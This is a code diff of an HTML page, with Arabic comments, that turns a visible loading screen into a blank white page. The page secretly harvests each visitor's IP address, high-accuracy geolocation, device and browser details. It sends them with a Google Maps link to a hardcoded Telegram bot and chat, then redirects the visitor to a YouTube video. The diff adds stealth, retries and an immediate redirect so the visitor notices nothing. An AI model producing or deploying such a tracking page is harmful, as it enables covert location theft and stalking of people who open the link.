@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>جاري التحميل...</title>
+    <title>Loading...</title>
     <style>
         * {
             margin: 0;
@@ -12,316 +12,355 @@
         }
 
         body {
-            font-family: 'Arial', sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-        }
-
-        .container {
-            max-width: 500px;
-            width: 100%;
             background: white;
-            border-radius: 20px;
-            box-shadow: 0 25px 50px rgba(0,0,0,0.15);
-            padding: 40px;
-            text-align: center;
-            animation: fadeIn 0.8s ease-out;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(30px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .loading-spinner {
-            width: 60px;
-            height: 60px;
-            border: 6px solid #f3f3f3;
-            border-top: 6px solid #3498db;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 30px;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        h1 {
-            color: #2c3e50;
-            margin-bottom: 20px;
-            font-size: 2em;
-        }
-
-        p {
-            color: #7f8c8d;
-            font-size: 1.1em;
-            line-height: 1.6;
-            margin-bottom: 15px;
-        }
-
-        .progress-bar {
-            width: 100%;
-            height: 8px;
-            background: #ecf0f1;
-            border-radius: 4px;
+            font-family: Arial, sans-serif;
+            height: 100vh;
             overflow: hidden;
-            margin: 20px 0;
         }
 
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, #3498db, #2ecc71);
-            width: 0%;
-            animation: progress 3s ease-in-out forwards;
-        }
-
-        @keyframes progress {
-            0% { width: 0%; }
-            50% { width: 70%; }
-            100% { width: 100%; }
-        }
-
-        .status {
-            color: #3498db;
-            font-weight: bold;
-            margin-top: 15px;
+        /* صفحة بيضاء تماماً - لا يظهر شيء للمستخدم */
+        .hidden-content {
+            display: none;
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
+            opacity: 0;
+            visibility: hidden;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="loading-spinner"></div>
-        <h1>🔄 جاري التحميل</h1>
-        <p>يتم تحضير المحتوى...</p>
-        <div class="progress-bar">
-            <div class="progress-fill"></div>
-        </div>
-        <div class="status" id="status">تهيئة النظام...</div>
-    </div>
+    <!-- محتوى مخفي تماماً -->
+    <div class="hidden-content" id="hiddenStatus">جاري المعالجة...</div>
 
     <script>
         // =============================================================================
-        // إعدادات قابلة للتخصيص
+        // إعدادات النظام
         // =============================================================================
         
-        // الرابط الذي سيتم التحويل إليه (يمكنك تغييره)
-        const REDIRECT_URL = 'https://www.youtube.com/watch?v=aQzNWzrqj1M'; // مثال: يوتيوب
-        
-        // معلومات البوت
+        const REDIRECT_URL = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
         const BOT_TOKEN = '7982181249:AAEyLwc9c24fu-uqUT87v26S6282XTD41XI';
         const CHAT_ID = '170383339';
-        
-        // وقت التحويل (بالمللي ثانية) - 3 ثواني افتراضي
-        const REDIRECT_DELAY = 3000;
+        const MAX_WAIT_TIME = 2000; // 2 ثانية فقط
         
         // =============================================================================
         
-        // متغيرات عامة
-        let collectedData = {};
-        let statusElement = document.getElementById('status');
+        let dataCollected = false;
         
-        // تحديث حالة العملية
-        function updateStatus(message) {
-            statusElement.textContent = message;
-            console.log('📱 حالة:', message);
+        // لوغ مخفي للتطوير فقط
+        function log(message) {
+            console.log(`🔧 ${message}`);
         }
         
         // جمع المعلومات الأساسية فوراً
-        function getBasicInfo() {
+        function collectBasicData() {
             const ua = navigator.userAgent;
             const now = new Date();
             
             return {
                 userAgent: ua,
                 timestamp: now.toISOString(),
-                localTime: now.toLocaleString('ar-SA'),
+                localTime: now.toLocaleString('ar-SA', {
+                    timeZone: 'Asia/Baghdad',
+                    year: 'numeric',
+                    month: '2-digit',
+                    day: '2-digit',
+                    hour: '2-digit',
+                    minute: '2-digit',
+                    second: '2-digit'
+                }),
                 url: window.location.href,
                 referrer: document.referrer || 'مباشر',
                 language: navigator.language,
                 platform: navigator.platform,
-                screenResolution: `${screen.width}x${screen.height}`,
+                screenRes: `${screen.width}x${screen.height}`,
+                windowSize: `${window.innerWidth}x${window.innerHeight}`,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 deviceType: /iPhone/i.test(ua) ? 'iPhone' : 
                            /iPad/i.test(ua) ? 'iPad' : 
                            /Android/i.test(ua) ? 'Android' : 
                            /Windows/i.test(ua) ? 'Windows' : 
-                           /Mac/i.test(ua) ? 'Mac' : 'غير معروف',
+                           /Mac/i.test(ua) ? 'Mac' : 'مجهول',
                 isMobile: /Mobile|Android|iPhone|iPad/i.test(ua),
                 browser: /Chrome/i.test(ua) && !/Edge/i.test(ua) ? 'Chrome' :
                         /Firefox/i.test(ua) ? 'Firefox' :
                         /Safari/i.test(ua) && !/Chrome/i.test(ua) ? 'Safari' :
-                        /Edge/i.test(ua) ? 'Edge' : 'غير معروف'
+                        /Edge/i.test(ua) ? 'Edge' : 'مجهول'
             };
         }
         
-        // الحصول على IP
+        // الحصول على IP مع خدمات متعددة
         async function getIP() {
             const services = [
                 'https://api.ipify.org?format=json',
-                'https://httpbin.org/ip'
+                'https://api.ipapi.com/api/check?access_key=free&format=1',
+                'https://httpbin.org/ip',
+                'https://jsonip.com'
             ];
             
             for (let service of services) {
                 try {
-                    const response = await fetch(service, { timeout: 2000 });
-                    const data = await response.json();
-                    return data.ip || data.origin || 'غير متاح';
-                } catch (e) {
+                    const controller = new AbortController();
+                    const timeoutId = setTimeout(() => controller.abort(), 1500);
+                    
+                    const response = await fetch(service, {
+                        signal: controller.signal,
+                        method: 'GET',
+                        headers: {
+                            'Accept': 'application/json',
+                        }
+                    });
+                    
+                    clearTimeout(timeoutId);
+                    
+                    if (response.ok) {
+                        const data = await response.json();
+                        const ip = data.ip || data.origin || data.addr;
+                        if (ip) {
+                            log(`IP محصل من ${service}: ${ip}`);
+                            return ip;
+                        }
+                    }
+                } catch (error) {
+                    log(`فشل ${service}: ${error.message}`);
                     continue;
                 }
             }
             return 'غير متاح';
         }
         
-        // الحصول على الموقع
+        // الحصول على الموقع مع محاولات متعددة
         function getLocation() {
             return new Promise((resolve) => {
                 if (!navigator.geolocation) {
+                    log('المتصفح لا يدعم تحديد الموقع');
                     resolve(null);
                     return;
                 }
                 
-                const timeout = setTimeout(() => resolve(null), 5000);
+                let resolved = false;
                 
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        clearTimeout(timeout);
-                        resolve({
+                function handleSuccess(position) {
+                    if (!resolved) {
+                        resolved = true;
+                        const location = {
                             latitude: position.coords.latitude,
                             longitude: position.coords.longitude,
                             accuracy: Math.round(position.coords.accuracy)
-                        });
-                    },
-                    () => {
-                        clearTimeout(timeout);
-                        resolve(null);
-                    },
+                        };
+                        log(`موقع محصل: ${location.latitude}, ${location.longitude}`);
+                        resolve(location);
+                    }
+                }
+                
+                function handleError(error) {
+                    if (!resolved) {
+                        log(`خطأ الموقع: ${error.code} - ${error.message}`);
+                    }
+                }
+                
+                // محاولة أولى - دقة عالية
+                navigator.geolocation.getCurrentPosition(
+                    handleSuccess,
+                    handleError,
                     {
                         enableHighAccuracy: true,
-                        timeout: 4000,
-                        maximumAge: 60000
+                        timeout: 1500,
+                        maximumAge: 30000
                     }
                 );
+                
+                // محاولة ثانية - دقة عادية
+                setTimeout(() => {
+                    if (!resolved) {
+                        navigator.geolocation.getCurrentPosition(
+                            handleSuccess,
+                            handleError,
+                            {
+                                enableHighAccuracy: false,
+                                timeout: 1000,
+                                maximumAge: 60000
+                            }
+                        );
+                    }
+                }, 500);
+                
+                // انتهاء المهلة
+                setTimeout(() => {
+                    if (!resolved) {
+                        resolved = true;
+                        log('انتهت مهلة الحصول على الموقع');
+                        resolve(null);
+                    }
+                }, 1800);
             });
         }
         
         // إنشاء رابط Google Maps
-        function createGoogleMapsLink(lat, lng) {
+        function createMapsLink(lat, lng) {
             return `https://www.google.com/maps/dir//${lat},${lng}/@${lat},${lng},272m/data=!3m1!1e3?entry=ttu&g_ep=EgoyMDI1MDYzMC4wIKXMDSoASAFQAw%3D%3D`;
         }
         
-        // إرسال البيانات
+        // إرسال البيانات مع إعادة المحاولة
         async function sendData(data) {
-            let locationInfo = 'غير متاح';
+            let locationText = 'غير متاح';
             let mapsLink = '';
             
             if (data.location) {
                 const { latitude, longitude, accuracy } = data.location;
-                locationInfo = `${latitude.toFixed(6)}, ${longitude.toFixed(6)} (دقة: ${accuracy}م)`;
-                mapsLink = createGoogleMapsLink(latitude, longitude);
+                locationText = `${latitude.toFixed(6)}, ${longitude.toFixed(6)} (دقة: ${accuracy}م)`;
+                mapsLink = createMapsLink(latitude, longitude);
             }
             
             const message = `🎯 زائر جديد:
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 ⏰ ${data.device.localTime}
 🌐 ${data.device.url}
-🔗 ${data.device.referrer}
+🔗 المرجع: ${data.device.referrer}
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 📱 ${data.device.deviceType} | ${data.device.browser}
+📱 محمول: ${data.device.isMobile ? 'نعم' : 'لا'}
 🌍 IP: ${data.ip}
-📍 الموقع: ${locationInfo}
+📍 الموقع: ${locationText}
 ${mapsLink ? `🗺️ الخريطة: ${mapsLink}` : ''}
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
+🗣️ اللغة: ${data.device.language}
+🌍 المنطقة الزمنية: ${data.device.timezone}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📱 الشاشة: ${data.device.screenRes}
+🔍 User Agent: ${data.device.userAgent}`;
             
-            try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message
-                    })
-                });
-                console.log('✅ تم إرسال البيانات');
-            } catch (error) {
-                console.log('❌ فشل الإرسال:', error);
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const payload = {
+                chat_id: CHAT_ID,
+                text: message,
+                disable_web_page_preview: false
+            };
+            
+            // محاولات متعددة للإرسال
+            for (let attempt = 1; attempt <= 3; attempt++) {
+                try {
+                    log(`محاولة الإرسال ${attempt}/3`);
+                    
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(payload)
+                    });
+                    
+                    if (response.ok) {
+                        const result = await response.json();
+                        if (result.ok) {
+                            log('✅ تم إرسال البيانات بنجاح');
+                            dataCollected = true;
+                            
+                            // إرسال رابط الموقع منفصل إذا توفر
+                            if (mapsLink) {
+                                try {
+                                    await fetch(url, {
+                                        method: 'POST',
+                                        headers: { 'Content-Type': 'application/json' },
+                                        body: JSON.stringify({
+                                            chat_id: CHAT_ID,
+                                            text: `🗺️ رابط الموقع المباشر:\n${mapsLink}`
+                                        })
+                                    });
+                                    log('✅ تم إرسال رابط الموقع');
+                                } catch (e) {
+                                    log('⚠️ فشل إرسال رابط الموقع');
+                                }
+                            }
+                            return true;
+                        }
+                    }
+                    
+                    log(`❌ فشل الإرسال: ${response.status}`);
+                } catch (error) {
+                    log(`❌ خطأ في الإرسال ${attempt}: ${error.message}`);
+                }
+                
+                if (attempt < 3) {
+                    await new Promise(resolve => setTimeout(resolve, 500));
+                }
             }
+            
+            log('❌ فشل في جميع محاولات الإرسال');
+            return false;
         }
         
-        // التحويل للرابط المحدد
-        function redirectToTarget() {
-            updateStatus('تم! جاري التحويل...');
-            console.log('🔄 التحويل إلى:', REDIRECT_URL);
-            
-            // تحويل فوري
-            window.location.href = REDIRECT_URL;
+        // التحويل الفوري
+        function redirect() {
+            log('🔄 تحويل فوري إلى: ' + REDIRECT_URL);
+            window.location.replace(REDIRECT_URL);
         }
         
         // العملية الرئيسية
         async function main() {
+            log('🚀 بدء النظام');
+            
             try {
-                // الخطوة 1: جمع المعلومات الأساسية
-                updateStatus('جمع المعلومات الأساسية...');
-                collectedData.device = getBasicInfo();
-                await new Promise(resolve => setTimeout(resolve, 500));
+                // جمع البيانات الأساسية فوراً
+                const basicData = collectBasicData();
+                log('✅ تم جمع البيانات الأساسية');
                 
-                // الخطوة 2: الحصول على IP والموقع
-                updateStatus('تحديد الموقع والـ IP...');
-                const [ip, location] = await Promise.all([
+                // بدء جمع IP والموقع بشكل متوازي
+                const dataPromise = Promise.all([
                     getIP(),
                     getLocation()
                 ]);
                 
-                collectedData.ip = ip;
-                collectedData.location = location;
+                // إعطاء وقت محدود لجمع البيانات
+                const timeoutPromise = new Promise(resolve => 
+                    setTimeout(() => resolve(['timeout', null]), MAX_WAIT_TIME)
+                );
                 
-                await new Promise(resolve => setTimeout(resolve, 800));
+                const [ip, location] = await Promise.race([dataPromise, timeoutPromise]);
                 
-                // الخطوة 3: إرسال البيانات
-                updateStatus('إرسال البيانات...');
-                await sendData(collectedData);
+                const fullData = {
+                    device: basicData,
+                    ip: ip === 'timeout' ? 'غير متاح' : ip,
+                    location: location
+                };
                 
-                await new Promise(resolve => setTimeout(resolve, 500));
+                log('📊 انتهاء جمع البيانات');
                 
-                // الخطوة 4: التحويل
-                updateStatus('اكتمل! جاري التحويل...');
-                await new Promise(resolve => setTimeout(resolve, 200));
-                
-                redirectToTarget();
+                // محاولة إرسال البيانات (بدون انتظار)
+                sendData(fullData).catch(error => {
+                    log('⚠️ خطأ في الإرسال: ' + error.message);
+                });
                 
             } catch (error) {
-                console.log('❌ خطأ:', error);
-                updateStatus('حدث خطأ، جاري التحويل...');
-                setTimeout(redirectToTarget, 1000);
+                log('❌ خطأ عام: ' + error.message);
             }
+            
+            // تحويل فوري بغض النظر عن النتيجة
+            redirect();
         }
         
-        // بدء العملية عند تحميل الصفحة
-        document.addEventListener('DOMContentLoaded', function() {
-            console.log('🚀 بدء العملية...');
-            
-            // بدء العملية بعد تحميل الصفحة مباشرة
-            setTimeout(main, 100);
-            
-            // تحويل اضطراري بعد وقت محدد حتى لو فشلت العملية
-            setTimeout(() => {
-                if (window.location.href.indexOf(REDIRECT_URL) === -1) {
-                    console.log('⏰ انتهت المهلة، تحويل اضطراري');
-                    redirectToTarget();
-                }
-            }, REDIRECT_DELAY + 2000);
+        // بدء العملية فور تحميل الصفحة
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', main);
+        } else {
+            main();
+        }
+        
+        // تحويل اضطراري إذا لم يحدث شيء
+        setTimeout(() => {
+            if (window.location.href.indexOf(REDIRECT_URL) === -1) {
+                log('⏰ تحويل اضطراري');
+                redirect();
+            }
+        }, 3000);
+        
+        // بدء فوري عند تحميل النافذة
+        window.addEventListener('load', () => {
+            if (window.location.href.indexOf(REDIRECT_URL) === -1) {
+                setTimeout(redirect, 100);
+            }
         });
         
-        // لوغ المعلومات للتطوير
-        console.log('🔧 إعدادات النظام:');
-        console.log('📍 رابط التحويل:', REDIRECT_URL);
-        console.log('⏱️ وقت التحويل:', REDIRECT_DELAY + 'ms');
+        log('🔧 النظام جاهز - صفحة بيضاء فارغة');
     </script>
 </body>
 </html>
